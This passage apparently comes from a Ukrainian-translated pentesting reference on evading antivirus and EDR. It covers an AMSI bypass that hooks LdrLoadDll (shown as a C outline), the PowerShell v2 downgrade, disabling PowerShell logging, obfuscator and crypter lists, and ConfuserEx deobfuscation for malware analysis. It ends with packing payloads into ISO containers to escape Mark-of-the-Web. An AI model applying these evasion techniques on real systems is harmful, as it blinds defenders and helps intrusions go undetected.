–Ü—Å–Ω—É—î —Ç–∞–∫–æ–∂ –±–∞–≥–∞—Ç–æ —ñ–Ω—à–∏—Ö —Ç–µ—Ö–Ω—ñ–∫ –æ–±—Ö–æ–¥—É AMSI –∑ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è–º powershell, –ø–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) —Ç–∞ [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) —â–æ–± –¥—ñ–∑–Ω–∞—Ç–∏—Å—è –±—ñ–ª—å—à–µ –ø—Ä–æ –Ω–∏—Ö.

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

AMSI —ñ–Ω—ñ—Ü—ñ–∞–ª—ñ–∑—É—î—Ç—å—Å—è –ª–∏—à–µ –ø—ñ—Å–ª—è —Ç–æ–≥–æ, —è–∫ `amsi.dll` –±—É–¥–µ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–æ –≤ –ø–æ—Ç–æ—á–Ω–∏–π –ø—Ä–æ—Ü–µ—Å. –ù–∞–¥—ñ–π–Ω–∏–π, –Ω–µ–∑–∞–ª–µ–∂–Ω–∏–π –≤—ñ–¥ –º–æ–≤–∏ –æ–±—Ö—ñ–¥ ‚Äî –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ user‚Äëmode hook –Ω–∞ `ntdll!LdrLoadDll`, —è–∫–∏–π –ø–æ–≤–µ—Ä—Ç–∞—î –ø–æ–º–∏–ª–∫—É, –∫–æ–ª–∏ –∑–∞–ø–∏—Ç—É–≤–∞–Ω–∏–π –º–æ–¥—É–ª—å ‚Äî `amsi.dll`. –£ —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ñ AMSI –Ω—ñ–∫–æ–ª–∏ –Ω–µ –∑–∞–≤–∞–Ω—Ç–∞–∂—É—î—Ç—å—Å—è —ñ –¥–ª—è —Ü—å–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—É —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è –Ω–µ –≤—ñ–¥–±—É–≤–∞—é—Ç—å—Å—è.

Implementation outline (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found ‚Üí AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‚Äëbyte jmp thunk
}
```
–ü—Ä–∏–º—ñ—Ç–∫–∏
- –ü—Ä–∞—Ü—é—î –¥–ª—è PowerShell, WScript/CScript —Ç–∞ –∫–∞—Å—Ç–æ–º–Ω–∏—Ö –∑–∞–≥—Ä—É–∑—á–∏–∫—ñ–≤ (–±—É–¥—å‚Äë—â–æ, —â–æ –≤ —ñ–Ω—à–æ–º—É –≤–∏–ø–∞–¥–∫—É –∑–∞–≤–∞–Ω—Ç–∞–∂–∏–ª–æ –± AMSI).
- –ü–æ—î–¥–Ω—É–≤–∞—Ç–∏ –∑ –ø–µ—Ä–µ–¥–∞—á–µ—é —Å–∫—Ä–∏–ø—Ç—ñ–≤ —á–µ—Ä–µ–∑ stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`), —â–æ–± —É–Ω–∏–∫–Ω—É—Ç–∏ –¥–æ–≤–≥–∏—Ö –∞—Ä—Ç–µ—Ñ–∞–∫—Ç—ñ–≤ —É –∫–æ–º–∞–Ω–¥–Ω–æ–º—É —Ä—è–¥–∫—É.
- –°–ø–æ—Å—Ç–µ—Ä—ñ–≥–∞–ª–æ—Å—å –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Ü–∏–º –∑–∞–≥—Ä—É–∑—á–∏–∫–∞–º–∏, —â–æ –∑–∞–ø—É—Å–∫–∞—é—Ç—å—Å—è —á–µ—Ä–µ–∑ LOLBins (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `regsvr32`, —è–∫–∏–π –≤–∏–∫–ª–∏–∫–∞—î `DllRegisterServer`).

This tools [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) also generates script to bypass AMSI.

**Remove the detected signature**

–í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç —Ç–∞–∫–∏–π —è–∫ **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** —ñ **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)**, —â–æ–± –≤–∏–¥–∞–ª–∏—Ç–∏ –≤–∏—è–≤–ª–µ–Ω–∏–π –ø—ñ–¥–ø–∏—Å AMSI –∑ –ø–∞–º'—è—Ç—ñ –ø–æ—Ç–æ—á–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—É. –¶–µ–π —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –ø—Ä–∞—Ü—é—î —à–ª—è—Ö–æ–º —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è –ø–∞–º'—è—Ç—ñ –ø–æ—Ç–æ—á–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—É –Ω–∞ –ø—ñ–¥–ø–∏—Å AMSI —Ç–∞ –ø–µ—Ä–µ–∑–∞–ø–∏—Å—É –π–æ–≥–æ —ñ–Ω—Å—Ç—Ä—É–∫—Ü—ñ—è–º–∏ NOP, –µ—Ñ–µ–∫—Ç–∏–≤–Ω–æ –≤–∏–¥–∞–ª—è—é—á–∏ –π–æ–≥–æ –∑ –ø–∞–º'—è—Ç—ñ.

**AV/EDR products that uses AMSI**

–í–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ —Å–ø–∏—Å–æ–∫ AV/EDR –ø—Ä–æ–¥—É–∫—Ç—ñ–≤, —è–∫—ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å AMSI, —É **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Use Powershell version 2**
–Ø–∫—â–æ –≤–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç–µ PowerShell –≤–µ—Ä—Å—ñ—ó 2, AMSI –Ω–µ –±—É–¥–µ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–æ, —Ç–æ–∂ –≤–∏ –º–æ–∂–µ—Ç–µ –∑–∞–ø—É—Å–∫–∞—Ç–∏ —Å–≤–æ—ó —Å–∫—Ä–∏–ø—Ç–∏ –±–µ–∑ —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è AMSI. –í–∏ –º–æ–∂–µ—Ç–µ –∑—Ä–æ–±–∏—Ç–∏ —Ü–µ:
```bash
powershell.exe -version 2
```
## –õ–æ–≥—É–≤–∞–Ω–Ω—è PS

PowerShell logging ‚Äî —Ü–µ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å, —è–∫–∞ –¥–æ–∑–≤–æ–ª—è—î –∑–∞–ø–∏—Å—É–≤–∞—Ç–∏ –≤—Å—ñ –∫–æ–º–∞–Ω–¥–∏ PowerShell, –≤–∏–∫–æ–Ω–∞–Ω—ñ –Ω–∞ —Å–∏—Å—Ç–µ–º—ñ. –¶–µ –∫–æ—Ä–∏—Å–Ω–æ –¥–ª—è –∞—É–¥–∏—Ç—É —Ç–∞ —É—Å—É–Ω–µ–Ω–Ω—è –Ω–µ—Å–ø—Ä–∞–≤–Ω–æ—Å—Ç–µ–π, –∞–ª–µ —Ç–∞–∫–æ–∂ –º–æ–∂–µ –±—É—Ç–∏ **–ø—Ä–æ–±–ª–µ–º–æ—é –¥–ª—è –∞—Ç–∞–∫—É—é—á–∏—Ö, —è–∫—ñ —Ö–æ—á—É—Ç—å —É–Ω–∏–∫–Ω—É—Ç–∏ –≤–∏—è–≤–ª–µ–Ω–Ω—è**.

–©–æ–± –æ–±—ñ–π—Ç–∏ –ª–æ–≥—É–≤–∞–Ω–Ω—è PowerShell, –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ –Ω–∞—Å—Ç—É–ø–Ω—ñ —Ç–µ—Ö–Ω—ñ–∫–∏:

- **Disable PowerShell Transcription and Module Logging**: –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç, —Ç–∞–∫–∏–π —è–∫ [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs), –¥–ª—è —Ü—ñ—î—ó –º–µ—Ç–∏.
- **Use Powershell version 2**: —è–∫—â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ PowerShell –≤–µ—Ä—Å—ñ—ó 2, AMSI –Ω–µ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç—å—Å—è, —Ç–æ–∂ –≤–∏ –∑–º–æ–∂–µ—Ç–µ –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ —Å–∫—Ä–∏–ø—Ç–∏ –±–µ–∑ —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è AMSI. –ú–æ–∂–Ω–∞ –∑—Ä–æ–±–∏—Ç–∏ —Ç–∞–∫: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–π—Ç–µ [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell), —â–æ–± –∑–∞–ø—É—Å—Ç–∏—Ç–∏ powershell –±–µ–∑ –∑–∞—Ö–∏—Å—Ç—ñ–≤ (—Å–∞–º–µ —Ü–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î `powerpick` –∑ Cobal Strike).

## –û–±—Ñ—É—Å–∫–∞—Ü—ñ—è

> [!TIP]
> –î–µ–∫—ñ–ª—å–∫–∞ —Ç–µ—Ö–Ω—ñ–∫ –æ–±—Ñ—É—Å–∫–∞—Ü—ñ—ó —Å–ø–∏—Ä–∞—é—Ç—å—Å—è –Ω–∞ —à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è –¥–∞–Ω–∏—Ö, —â–æ –ø—ñ–¥–≤–∏—â—É—î –µ–Ω—Ç—Ä–æ–ø—ñ—é –±—ñ–Ω–∞—Ä–Ω–∏–∫–∞ —ñ –ø–æ–ª–µ–≥—à—É—î –π–æ–≥–æ –≤–∏—è–≤–ª–µ–Ω–Ω—è AVs —Ç–∞ EDRs. –ë—É–¥—å—Ç–µ –æ–±–µ—Ä–µ–∂–Ω—ñ –∑ —Ü–∏–º —ñ –º–æ–∂–ª–∏–≤–æ –∑–∞—Å—Ç–æ—Å–æ–≤—É–π—Ç–µ —à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è –ª–∏—à–µ –¥–æ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏—Ö —á–∞—Å—Ç–∏–Ω –∫–æ–¥—É, —è–∫—ñ —î —á—É—Ç–ª–∏–≤–∏–º–∏ –∞–±–æ –º–∞—é—Ç—å –±—É—Ç–∏ –ø—Ä–∏—Ö–æ–≤–∞–Ω—ñ.

### –î–µ–æ–±—Ñ—É—Å–∫–∞—Ü—ñ—è ConfuserEx-–∑–∞—Ö–∏—â–µ–Ω–∏—Ö .NET –±—ñ–Ω–∞—Ä–Ω–∏–∫—ñ–≤

–ü—ñ–¥ —á–∞—Å –∞–Ω–∞–ª—ñ–∑—É malware, —â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î ConfuserEx 2 (–∞–±–æ –∫–æ–º–µ—Ä—Ü—ñ–π–Ω—ñ —Ñ–æ—Ä–∫–∏), —á–∞—Å—Ç–æ –∑—É—Å—Ç—Ä—ñ—á–∞—é—Ç—å—Å—è –∫—ñ–ª—å–∫–∞ —à–∞—Ä—ñ–≤ –∑–∞—Ö–∏—Å—Ç—É, —è–∫—ñ –±–ª–æ–∫—É—é—Ç—å decompilers —ñ sandboxes. –ù–∞–≤–µ–¥–µ–Ω–∏–π –Ω–∏–∂—á–µ —Ä–æ–±–æ—á–∏–π –ø—Ä–æ—Ü–µ—Å –Ω–∞–¥—ñ–π–Ω–æ **–≤—ñ–¥–Ω–æ–≤–ª—é—î –º–∞–π–∂–µ –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–∏–π IL**, —è–∫–∏–π –ø–æ—Ç—ñ–º –º–æ–∂–Ω–∞ –¥–µ–∫–æ–º–ø—ñ–ª—é–≤–∞—Ç–∏ –≤ C# –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ñ–≤ —Ç–∏–ø—É dnSpy –∞–±–æ ILSpy.

1.  Anti-tampering removal ‚Äì ConfuserEx —à–∏—Ñ—Ä—É—î –∫–æ–∂–Ω–µ *method body* —ñ —Ä–æ–∑—à–∏—Ñ—Ä–æ–≤—É—î –π–æ–≥–æ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ static constructor –º–æ–¥—É–ª—è (`<Module>.cctor`). –¶–µ —Ç–∞–∫–æ–∂ –ø–∞—Ç—á–∏—Ç—å PE checksum, —Ç–æ–º—É –±—É–¥—å-—è–∫–∞ –º–æ–¥–∏—Ñ—ñ–∫–∞—Ü—ñ—è –º–æ–∂–µ –ø—Ä–∏–∑–≤–µ—Å—Ç–∏ –¥–æ –ø–∞–¥—ñ–Ω–Ω—è –±—ñ–Ω–∞—Ä–Ω–∏–∫–∞. –í–∏–∫–æ—Ä–∏—Å—Ç–∞–π—Ç–µ **AntiTamperKiller**, —â–æ–± –∑–Ω–∞–π—Ç–∏ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω—ñ —Ç–∞–±–ª–∏—Ü—ñ –º–µ—Ç–∞–¥–∞–Ω–∏—Ö, –≤—ñ–¥–Ω–æ–≤–∏—Ç–∏ XOR-–∫–ª—é—á—ñ —ñ –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç–∏ —á–∏—Å—Ç—É –∑–±—ñ—Ä–∫—É:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
–í–∏–≤—ñ–¥ –º—ñ—Å—Ç–∏—Ç—å 6 –ø–∞—Ä–∞–º–µ—Ç—Ä—ñ–≤ anti-tamper (`key0-key3`, `nameHash`, `internKey`), —è–∫—ñ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –∫–æ—Ä–∏—Å–Ω—ñ –ø—Ä–∏ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—ñ –≤–ª–∞—Å–Ω–æ–≥–æ unpacker.

2.  Symbol / control-flow recovery ‚Äì –ø–µ—Ä–µ–¥–∞–π—Ç–µ *clean* —Ñ–∞–π–ª —É **de4dot-cex** (—Ñ–æ—Ä–∫ de4dot –∑ –ø—ñ–¥—Ç—Ä–∏–º–∫–æ—é ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
‚Ä¢ `-p crx` ‚Äì –≤–∏–±—Ä–∞—Ç–∏ –ø—Ä–æ—Ñ—ñ–ª—å ConfuserEx 2  
‚Ä¢ de4dot —Å–∫–∞—Å—É—î control-flow flattening, –≤—ñ–¥–Ω–æ–≤–∏—Ç—å –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω—ñ –ø—Ä–æ—Å—Ç–æ—Ä–∏ —ñ–º–µ–Ω, –∫–ª–∞—Å–∏ —Ç–∞ —ñ–º–µ–Ω–∞ –∑–º—ñ–Ω–Ω–∏—Ö, –∞ —Ç–∞–∫–æ–∂ —Ä–æ–∑—à–∏—Ñ—Ä—É—î –∫–æ–Ω—Å—Ç–∞–Ω—Ç–Ω—ñ —Ä—è–¥–∫–∏.

3.  Proxy-call stripping ‚Äì ConfuserEx –∑–∞–º—ñ–Ω—é—î –ø—Ä—è–º—ñ –≤–∏–∫–ª–∏–∫–∏ –º–µ—Ç–æ–¥—ñ–≤ –Ω–∞ –ª–µ–≥–∫–æ–≤—ñ—Å–Ω—ñ wrapper-—Ñ—É–Ω–∫—Ü—ñ—ó (—Ç–∞–∫ –∑–≤–∞–Ω—ñ *proxy calls*), —â–æ–± —â–µ –±—ñ–ª—å—à–µ —É—Å–∫–ª–∞–¥–Ω–∏—Ç–∏ –¥–µ–∫–æ–º–ø—ñ–ª—è—Ü—ñ—é. –í–∏–¥–∞–ª—ñ—Ç—å —ó—Ö –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
–ü—ñ—Å–ª—è —Ü—å–æ–≥–æ –∫—Ä–æ–∫—É –≤–∏ –ø–æ–≤–∏–Ω–Ω—ñ –±–∞—á–∏—Ç–∏ –∑–≤–∏—á–∞–π–Ω—ñ .NET API, —Ç–∞–∫—ñ —è–∫ `Convert.FromBase64String` –∞–±–æ `AES.Create()` –∑–∞–º—ñ—Å—Ç—å –Ω–µ–ø—Ä–æ–∑–æ—Ä–∏—Ö wrapper-—Ñ—É–Ω–∫—Ü—ñ–π (`Class8.smethod_10`, ‚Ä¶).

4.  Manual clean-up ‚Äì –∑–∞–ø—É—Å—Ç—ñ—Ç—å –æ—Ç—Ä–∏–º–∞–Ω–∏–π –±—ñ–Ω–∞—Ä–Ω–∏–∫ —É dnSpy, –ø–æ—à—É–∫–∞–π—Ç–µ –≤–µ–ª–∏–∫—ñ Base64-–±–ª–æ–∫–∏ –∞–±–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è `RijndaelManaged`/`TripleDESCryptoServiceProvider`, —â–æ–± –∑–Ω–∞–π—Ç–∏ *—Ä–µ–∞–ª—å–Ω–∏–π* payload. –ß–∞—Å—Ç–æ malware –∑–±–µ—Ä—ñ–≥–∞—î –π–æ–≥–æ —è–∫ TLV-encoded –º–∞—Å–∏–≤ –±–∞–π—Ç—ñ–≤, —ñ–Ω—ñ—Ü—ñ–∞–ª—ñ–∑–æ–≤–∞–Ω–∏–π –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ `<Module>.byte_0`.

–ù–∞–≤–µ–¥–µ–Ω–∞ –ª–∞–Ω—Ü—é–∂–æ–∫ –≤—ñ–¥–Ω–æ–≤–ª—é—î –ø–æ—Ç—ñ–∫ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è **–±–µ–∑** –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ—Å—Ç—ñ –∑–∞–ø—É—Å–∫–∞—Ç–∏ —à–∫—ñ–¥–ª–∏–≤–∏–π –∑—Ä–∞–∑–æ–∫ ‚Äî –∫–æ—Ä–∏—Å–Ω–æ –ø—Ä–∏ —Ä–æ–±–æ—Ç—ñ –Ω–∞ –æ—Ñ–ª–∞–π–Ω-—Ä–æ–±–æ—á—ñ–π —Å—Ç–∞–Ω—Ü—ñ—ó.

> üõà  ConfuserEx —Å—Ç–≤–æ—Ä—é—î —Å–ø–µ—Ü—ñ–∞–ª—å–Ω–∏–π –∞—Ç—Ä–∏–±—É—Ç –∑ –Ω–∞–∑–≤–æ—é `ConfusedByAttribute`, —è–∫–∏–π –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ —è–∫ IOC –¥–ª—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ—ó —Ç—Ä–∏–∞–∂—ñ –∑—Ä–∞–∑–∫—ñ–≤.

#### –û–¥–Ω–æ–ª–∞–π–Ω–µ—Ä
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): –ú–µ—Ç–∞ —Ü—å–æ–≥–æ –ø—Ä–æ—î–∫—Ç—É ‚Äî –Ω–∞–¥–∞—Ç–∏ –≤—ñ–¥–∫—Ä–∏—Ç–∏–π —Ñ–æ—Ä–∫ –∫–æ–º–ø—ñ–ª—è—Ü—ñ–π–Ω–æ–≥–æ –Ω–∞–±–æ—Ä—É [LLVM], –∑–¥–∞—Ç–Ω–∏–π –ø—ñ–¥–≤–∏—â–∏—Ç–∏ –±–µ–∑–ø–µ–∫—É –ü–ó —á–µ—Ä–µ–∑ [code obfuscation] —Ç–∞ –∑–∞—Ö–∏—Å—Ç –≤—ñ–¥ –ø—ñ–¥—Ä–æ–±–∫–∏.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator –¥–µ–º–æ–Ω—Å—Ç—Ä—É—î, —è–∫ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –º–æ–≤—É `C++11/14` –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü—ñ—ó –ø—ñ–¥ —á–∞—Å –∫–æ–º–ø—ñ–ª—è—Ü—ñ—ó –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–æ–≥–æ –∫–æ–¥—É –±–µ–∑ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –∑–æ–≤–Ω—ñ—à–Ω—ñ—Ö —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ñ–≤ —ñ –±–µ–∑ –º–æ–¥–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –∫–æ–º–ø—ñ–ª—è—Ç–æ—Ä–∞.
- [**obfy**](https://github.com/fritzone/obfy): –î–æ–¥–∞—î —Ä—ñ–≤–µ–Ω—å –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—Ö –æ–ø–µ—Ä–∞—Ü—ñ–π, –∑–≥–µ–Ω–µ—Ä–æ–≤–∞–Ω–∏—Ö –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Ñ—Ä–µ–π–º–≤–æ—Ä–∫—É C++ template metaprogramming, —â–æ —É—Å–∫–ª–∞–¥–Ω–∏—Ç—å –∑–∞–≤–¥–∞–Ω–Ω—è —Ç–æ–º—É, —Ö—Ç–æ –∑–∞—Ö–æ—á–µ –∑–ª–∞–º–∞—Ç–∏ –¥–æ–¥–∞—Ç–æ–∫.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz ‚Äî x64 binary obfuscator, —è–∫–∏–π –≤–º—ñ—î –æ–±—Ñ—É—Å–∫—É–≤–∞—Ç–∏ —Ä—ñ–∑–Ω—ñ PE-—Ñ–∞–π–ª–∏, –≤–∫–ª—é—á–∞—é—á–∏: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame ‚Äî –ø—Ä–æ—Å—Ç–∏–π metamorphic code engine –¥–ª—è –¥–æ–≤—ñ–ª—å–Ω–∏—Ö –≤–∏–∫–æ–Ω—É–≤–∞–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator ‚Äî —Ç–æ–Ω–∫–æ—â—ñ ln–∞–∫–æ–≥–æ —Ñ—Ä–µ–π–º–æ—Ä–∫–∞ –æ–±—Ñ—É—Å–∫–∞—Ü—ñ—ó –∫–æ–¥—É –¥–ª—è –º–æ–≤, —â–æ –ø—ñ–¥—Ç—Ä–∏–º—É—é—Ç—å—Å—è LLVM, —è–∫–∏–π –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î ROP (return-oriented programming). ROPfuscator –æ–±—Ñ—É—Å–∫—É—î –ø—Ä–æ–≥—Ä–∞–º—É –Ω–∞ —Ä—ñ–≤–Ω—ñ assembly, –ø–µ—Ä–µ—Ç–≤–æ—Ä—é—é—á–∏ –∑–≤–∏—á–∞–π–Ω—ñ —ñ–Ω—Å—Ç—Ä—É–∫—Ü—ñ—ó –≤ ROP-–ª–∞–Ω—Ü—é–≥–∏, —Ä—É–π–Ω—É—é—á–∏ –Ω–∞—à–µ —É—è–≤–ª–µ–Ω–Ω—è –ø—Ä–æ –∑–≤–∏—á–Ω–∏–π –∫–æ–Ω—Ç—Ä–æ–ª—å –ø–æ—Ç–æ–∫—É.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt ‚Äî .NET PE Crypter, –Ω–∞–ø–∏—Å–∞–Ω–∏–π –Ω–∞ Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor –≤–º—ñ—î –∫–æ–Ω–≤–µ—Ä—Ç—É–≤–∞—Ç–∏ —ñ—Å–Ω—É—é—á—ñ EXE/DLL —É shellcode, –∞ –ø–æ—Ç—ñ–º –∑–∞–≤–∞–Ω—Ç–∞–∂—É–≤–∞—Ç–∏ —ó—Ö

## SmartScreen & MoTW

You may have seen this screen when downloading some executables from the internet and executing them.

Microsoft Defender SmartScreen is a security mechanism intended to protect the end user against running potentially malicious applications.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen mainly works with a reputation-based approach, meaning that uncommonly download applications will trigger SmartScreen thus alerting and preventing the end user from executing the file (although the file can still be executed by clicking More Info -> Run anyway).

**MoTW** (Mark of The Web) is an [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) with the name of Zone.Identifier which is automatically created upon download files from the internet, along with the URL it was downloaded from.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>–ü–µ—Ä–µ–≤—ñ—Ä–∫–∞ Zone.Identifier ADS –¥–ª—è —Ñ–∞–π–ª—É, –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–æ–≥–æ –∑ —ñ–Ω—Ç–µ—Ä–Ω–µ—Ç—É.</p></figcaption></figure>

> [!TIP]
> –í–∞–∂–ª–∏–≤–æ –∑–∞–∑–Ω–∞—á–∏—Ç–∏, —â–æ –≤–∏–∫–æ–Ω—É–≤–∞–Ω—ñ —Ñ–∞–π–ª–∏, –ø—ñ–¥–ø–∏—Å–∞–Ω—ñ **–¥–æ–≤—ñ—Ä–µ–Ω–∏–º** —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–æ–º –ø—ñ–¥–ø–∏—Å—É, **–Ω–µ —Å–ø—Ä–æ–≤–æ–∫—É—é—Ç—å SmartScreen**.

–î—É–∂–µ –µ—Ñ–µ–∫—Ç–∏–≤–Ω–∏–π —Å–ø–æ—Å—ñ–± –∑–∞–ø–æ–±—ñ–≥—Ç–∏ —Ç–æ–º—É, —â–æ–± –≤–∞—à—ñ payloads –æ—Ç—Ä–∏–º–∞–ª–∏ Mark of The Web ‚Äî —É–ø–∞–∫—É–≤–∞—Ç–∏ —ó—Ö —É—Å–µ—Ä–µ–¥–∏–Ω—ñ —è–∫–æ–≥–æ—Å—å –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥ ISO. –¶–µ –≤—ñ–¥–±—É–≤–∞—î—Ç—å—Å—è —Ç–æ–º—É, —â–æ Mark-of-the-Web (MOTW) **–Ω–µ –º–æ–∂–µ** –±—É—Ç–∏ –∑–∞—Å—Ç–æ—Å–æ–≤–∞–Ω–∏–π –¥–æ **–Ω–µ NTFS** —Ç–æ–º—ñ–≤.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) ‚Äî —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç, —è–∫–∏–π –ø–∞–∫—É—î payloads —É –≤–∏—Ö—ñ–¥–Ω—ñ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∏, —â–æ–± –æ–±—ñ–π—Ç–∏ Mark-of-the-Web.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
